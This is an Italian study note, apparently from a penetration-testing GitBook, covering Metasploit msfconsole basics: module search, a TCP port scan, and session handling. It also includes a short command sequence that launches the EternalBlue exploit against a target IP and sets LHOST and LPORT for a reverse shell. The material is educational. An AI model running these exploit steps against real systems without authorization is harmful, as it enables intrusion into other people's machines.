# MSFconsole Fundamentals

<figure><img src="../../.gitbook/assets/image (1015).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1016).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1017).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1018).png" alt=""><figcaption></figcaption></figure>

***

```
msfconsole
help
version
show all //mostra tutti i moduli
show exploits
show -h //aggiungiamo -h per help a qualsiasi comando
search portscan //per cercare un modulo con portscan
use auxiliary/scanner/portscan/tcp
show options
//Set variables
set RHOSTS 192.168.2.1
set PORTS 1-1000
run
back //o exit, per uscire dal modulo usato
search cve:2017 type:exploit platform:windows //per filtrare tramite CVE e filtri vari

```

<figure><img src="../../.gitbook/assets/image (1019).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1020).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1021).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1022).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1024).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1025).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1026).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1027).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1028).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1029).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1030).png" alt=""><figcaption></figcaption></figure>

## Moduli con payload

```
search eternalblue
use 0
show options
set payload ... //se necessario cambiarlo da 64 a 32bit ad esempio, o diverso OS
set RHOSTS 192.168.2.1
set LHOST //se necessario cambiarla per la reverse shell
set LPORT //se necessario, magari la porta è già occupata
exploit
```

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

In alcuni casi potrebbe essere necessario modificare il payload da 32 a 64 bit o da windows a linux

<figure><img src="../../.gitbook/assets/image (1032).png" alt=""><figcaption></figcaption></figure>

Per cambiare il payload possiamo usare il comando set paylod e poi specificando il tipo di payload:

<figure><img src="../../.gitbook/assets/image (1033).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1034).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1035).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1036).png" alt=""><figcaption></figcaption></figure>

## Gestire le sessioni

```
sessions
```

<figure><img src="../../.gitbook/assets/image (1037).png" alt=""><figcaption></figcaption></figure>

## Funzionalità aggiuntive

### Connect

```
connect -h
```

<figure><img src="../../.gitbook/assets/image (1038).png" alt=""><figcaption></figcaption></figure>

Possibilità di fare connessioni tipo con netcat, in sostanza ci permette di fare **banner grabbing**

<figure><img src="../../.gitbook/assets/image (1039).png" alt=""><figcaption></figcaption></figure>

Ci dice la porta che è stata usata per connettersi dall'attacker IP, e in caso di alcuni servizi ci mostra il banner relativo.

